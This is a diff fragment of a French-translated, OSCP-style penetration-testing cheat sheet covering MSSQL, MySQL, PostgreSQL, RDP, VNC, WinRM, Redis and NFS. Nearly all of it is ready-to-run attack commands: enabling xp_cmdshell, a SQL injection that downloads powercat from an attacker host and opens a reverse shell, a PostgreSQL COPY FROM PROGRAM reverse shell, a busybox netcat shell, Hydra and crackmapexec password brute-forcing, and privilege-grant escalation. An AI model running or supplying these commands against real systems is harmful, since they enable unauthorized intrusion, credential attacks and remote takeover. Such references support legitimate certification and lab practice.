 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=<username>,mssql.password=<password>,mssql.instance-name=<instance_name> -sV -p 1433 <target_ip>
+
 ```
 
 
@@ -2014,6 +2171,7 @@ crackmapexec mssql -d <domain> -u <username> -p <password> -x "whoami" <target_i
 
 # Interroger les bases de données et les énumérer
 crackmapexec mssql -d <domain> -u <username> -p <password> -x "SELECT name FROM master.dbo.sysdatabases;" <target_ip>
+
 ```
 
 
@@ -2025,13 +2183,14 @@ sqsh -S <target_ip> -U <username> -P <password>
 
 # Connectez-vous à MSSQL en utilisant sqsh (Windows)
 sqsh -S <target_ip> -U <domain>\\<username> -P <password> -D <database>
+
 ```
 
 
 <p class="oscp-command-note">Instruction SQL dans la rubrique « 1433: MSSQL ».</p>
 
 ```sql
--- Enable advanced options and xp_cmdshell for command execution
+-- Activer les options avancées and xp_cmdshell for command execution
 EXEC SP_CONFIGURE 'show advanced options', 1;
 RECONFIGURE;
 GO
@@ -2050,36 +2209,39 @@ GO
 
 EXEC xp_cmdshell 'c:\\Users\\Public\\reverse.exe';
 GO
+
 ```
 
 
 ```sql
 -- SQL Injection example to execute system commands
 test'; EXEC master.dbo.xp_cmdshell 'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://<attacker_ip>:<port>/powercat.ps1'');powercat -c <attacker_ip> -p <port> -e powershell"';--
+
 ```
 
 
 ```sql
--- List all the databases
+-- Lister les bases de données
 SELECT name FROM master.dbo.sysdatabases
                 
--- List all tables in the current database
+-- Lister les tables de la base courante
 SELECT * FROM information_schema.tables;
 
--- View contents of a specific table
+-- Afficher les données d'une table
 SELECT * FROM <table_name>;
 
--- Search for specific data in a table
+-- Rechercher des données dans une table
 SELECT * FROM <table_name> WHERE <column_name> LIKE '%<search_term>%';
 
--- Insert a new record into a table
+-- Insérer une ligne dans la table
 INSERT INTO <table_name> (<column1>, <column2>) VALUES ('<value1>', '<value2>');
 
--- Update an existing record in a table
+-- Modifier une ligne dans la table
 UPDATE <table_name> SET <column_name> = '<new_value>' WHERE <condition>;
 
--- Delete a record from a table
+-- Supprimer une ligne de la table
 DELETE FROM <table_name> WHERE <condition>;
+
 ```
 
 
@@ -2090,6 +2252,7 @@ DELETE FROM <table_name> WHERE <condition>;
 
 ```bash
 nmap -p 2049 -sV --script "nfs-showmount,nfs-ls,nfs-statfs,nfs-secure,nfs-client,disk,nfs-*" <target_ip>
+
 ```
 
 
@@ -2101,6 +2264,7 @@ showmount -e <target_ip>
 
 # Afficher les informations de montage pour la cible
 showmount <target_ip>
+
 ```
 
 
@@ -2112,6 +2276,7 @@ mkdir <mount_point>
 
 # Monter la part NFS
 sudo mount -t nfs -o vers=<version>,nolock <target_ip>:<share> <mount_point>
+
 ```
 
 
@@ -2129,6 +2294,7 @@ help
 
 # Vérifiez la version du service CGMS
 version
+
 ```
 
 
@@ -2143,6 +2309,7 @@ python3 cve2020-13151.py --ahost=<target_ip> --aport=3000 --pythonshell --lhost=
 
 # Démarrez un écouteur Netcat sur votre machine locale
 nc -nlvp 443
+
 ```
 
 
@@ -2216,6 +2383,7 @@ truncate-namespace
 truncate-namespace-undo
 truncate-undo
 version
+
 ```
 
 
@@ -2228,6 +2396,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 ```bash
 nmap -sV -p 3306 --script "mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122" <target_ip>
+
 ```
 
 
@@ -2235,6 +2404,7 @@ nmap -sV -p 3306 --script "mysql-audit,mysql-databases,mysql-dump-hashes,mysql-e
 
 ```bash
 crackmapexec mysql -d <database> -u <username> -p <password> -x "SHOW DATABASES;" <target_ip>
+
 ```
 
 
@@ -2243,6 +2413,7 @@ crackmapexec mysql -d <database> -u <username> -p <password> -x "SHOW DATABASES;
 ```bash
 # Brute force MySQL login using Hydra
 hydra -l <username> -P <password_list> -s 3306 -vV <IP> mysql
+
 ```
 
 
@@ -2250,6 +2421,7 @@ hydra -l <username> -P <password_list> -s 3306 -vV <IP> mysql
 
 ```bash
 mysql -h <target_ip> -u <username> -p <database>
+
 ```
 
 
@@ -2265,6 +2437,7 @@ SHOW TABLES;
 DESCRIBE <table_name>;
 
 SELECT * FROM <table_name>;
+
 ```
 
 
@@ -2277,6 +2450,7 @@ SELECT user FROM mysql.user;
 # Privilege Escalation
 GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
 FLUSH PRIVILEGES;
+
 ```
 
 
@@ -2293,6 +2467,7 @@ nc.exe WinServer\\apache:(I)(F)
     BUILTIN\\Administrators:(I)(F)  
     BUILTIN\\Users:(I)(RX)  
 Successfully processed 1 files; Failed processing 0 files
+
 ```
 
 
@@ -2303,6 +2478,7 @@ Successfully processed 1 files; Failed processing 0 files
 
 ```bash
 nmap --script "rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info,rdp-banner" -p 3389 <IP>
+
 ```
 
 
@@ -2310,6 +2486,7 @@ nmap --script "rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info,rdp-banner" -
 
 ```bash
 hydra -L <user_list> -P <password_list> -s 3389 rdp://<IP>
+
 ```
 
 
@@ -2321,6 +2498,7 @@ crowbar -b rdp -s <target_ip>/32 -U users.txt -C rockyou.txt
 
 # Utilisation de CrackMapExec
 crackmapexec rdp <target_ip> -u users.txt -p rockyou.txt
+
 ```
 
 
@@ -2341,6 +2519,7 @@ rdesktop -u $USER -p $PASSWORD -g 1920x1080 <ip>
 
 # Connexion en utilisant rdesktop sans identifiants
 rdesktop <ip>
+
 ```
 
 
@@ -2353,6 +2532,7 @@ Examiner les connexions, la configuration et les requêtes de la base de donnée
 
 ```bash
 nmap -sV -p 5432,5433 --script "postgresql-info,postgresql-user-enum,postgresql-ssl" <ip>
+
 ```
 
 
@@ -2360,6 +2540,7 @@ nmap -sV -p 5432,5433 --script "postgresql-info,postgresql-user-enum,postgresql-
 
 ```bash
 hydra -L users.txt -P passwords.txt -s 5432 <ip> postgresql
+
 ```
 
 
@@ -2367,6 +2548,7 @@ hydra -L users.txt -P passwords.txt -s 5432 <ip> postgresql
 
 ```bash
 crackmapexec postgres -d <DB_NAME> -u <USER> -p <PASSWORD> -t <ip>
+
 ```
 
 
@@ -2375,6 +2557,7 @@ crackmapexec postgres -d <DB_NAME> -u <USER> -p <PASSWORD> -t <ip>
 ```bash
 # -W: Demander un mot de passe
 psql -h <ip> -p 5432 -U <USER> -W
+
 ```
 
 
@@ -2385,6 +2568,7 @@ psql -h <ip> -p 5432 -U <USER> -W
 
 # Exécutez le script d'exploitation pour obtenir l'exécution de code à distance
 python3 50847.py -i <ip> -p 5437 -c "busybox nc $ATTACKER_IP 80 -e sh"
+
 ```
 
 
@@ -2404,6 +2588,7 @@ CREATE TABLE cmd_exec(cmd_output text);
 COPY cmd_exec FROM PROGRAM 'sh -i >& /dev/tcp/$KaliIP/8080 0>&1';
 SELECT * FROM cmd_exec;  
 DROP TABLE IF EXISTS cmd_exec;
+
 ```
 
 
@@ -2451,6 +2636,7 @@ UPDATE test_table SET name = 'updated_data' WHERE id = 1;
 
 # Delete data from a table
 DELETE FROM test_table WHERE id = 1;
+
 ```
 
 
@@ -2461,6 +2647,7 @@ DELETE FROM test_table WHERE id = 1;
 
 ```bash
 nmap -p 5900 --script vnc-info,vnc-auth-bypass <ip>
+
 ```
 
 
@@ -2472,6 +2659,7 @@ vncviewer <ip>:5900
 
 # Connexion plus détaillée avec l'authentification
 vncviewer -passwd /path/to/passwordfile <ip>:5900
+
 ```
 
 
@@ -2479,6 +2667,7 @@ vncviewer -passwd /path/to/passwordfile <ip>:5900
 
 ```bash
 hydra -L <user_list> -P <password_list> vnc://<ip>
+
 ```
 
 
@@ -2488,6 +2677,7 @@ hydra -L <user_list> -P <password_list> vnc://<ip>
 No Password
 vnc
 1234
+
 ```
 
 
@@ -2498,6 +2688,7 @@ vnc
 2. Run commands
 3. Capture screenshots with scrot
 4. Manipulate files
+
 ```
 
 
@@ -2510,6 +2701,7 @@ Observer les permissions et la configuration de Windows.
 
 ```bash
 nmap -p 5985,5986 --script winrm-info <ip>
+
 ```
 
 
@@ -2517,6 +2709,7 @@ nmap -p 5985,5986 --script winrm-info <ip>
 
 ```bash
 crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
+
 ```
 
 
@@ -2525,6 +2718,7 @@ crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
 ```powershell
 # Utilisation de PowerShell pour se connecter à WinRM
 Enter-PSSession -ComputerName <ip> -Credential (Get-Credential)
+
 ```
 
 
@@ -2533,6 +2727,7 @@ Enter-PSSession -ComputerName <ip> -Credential (Get-Credential)
 ```bash
 # utilisant Kali pour se connecter à WinRM
 evil-winrm -i <ip> -u <USER> -p <PASSWORD>
+
 ```
 
 
@@ -2543,6 +2738,7 @@ evil-winrm -i <ip> -u <USER> -p <PASSWORD>
 
 ```bash
 nmap -p 6379 --script "redis-info,redis-rce" <ip>
+
 ```
 
 
@@ -2550,6 +2746,7 @@ nmap -p 6379 --script "redis-info,redis-rce" <ip>
 
 ```bash
 redis-cli -h <ip> -p 6379 -a <password_to_try>
+
 ```
 
 
@@ -2564,6 +2761,7 @@ python3 redis-rogue-server.py -p 6379
 
 # Exécutez l'exploitation de Redis RCE à l'aide d'un script personnalisé (remplacez la charge utile souhaitée)
 python3 redis-rce-exploit.py -h <ip> -p 6379 -c "payload"
+
 ```
 
 
@@ -2584,6 +2782,7 @@ get mykey
 
 config get *  # View all configuration options
 shutdown      # Shutdown the Redis server
+
 ```
 
 
@@ -2597,6 +2796,7 @@ Vérifier les ports et les services de la cible autorisée.
 ```bash
 # Connectez-vous au port inconnu pour identifier le service
 nc -nv <IP> <PORT>
+
 ```
 
 
@@ -2605,6 +2805,7 @@ nc -nv <IP> <PORT>
 ```bash
 # Toujours lister les commandes ou options disponibles pour recueillir plus d'informations sur le service
 help
+
 ```
 
 
@@ -2618,6 +2819,7 @@ echo -e "<USERNAME>\n<PASSWORD>" | nc -nv <IP> <PORT>
 # Si le service fournit des options de commande ou aide à la sortie, utilisez-les pour guider d'autres actions
 # Par exemple, si le service a des commandes comme 'list', 'status' ou 'config', utilisez ces
 echo "list" | nc -nv <IP> <PORT>
+
 ```
 
 
@@ -2633,6 +2835,7 @@ echo "list" | nc -nv <IP> <PORT>
 # - Collecte d'informations sur l'état ou la configuration du service
 
 # Remplacer par des commandes appropriées basées sur le service identifié et la sortie d'aide
+
 ```
 
 ---
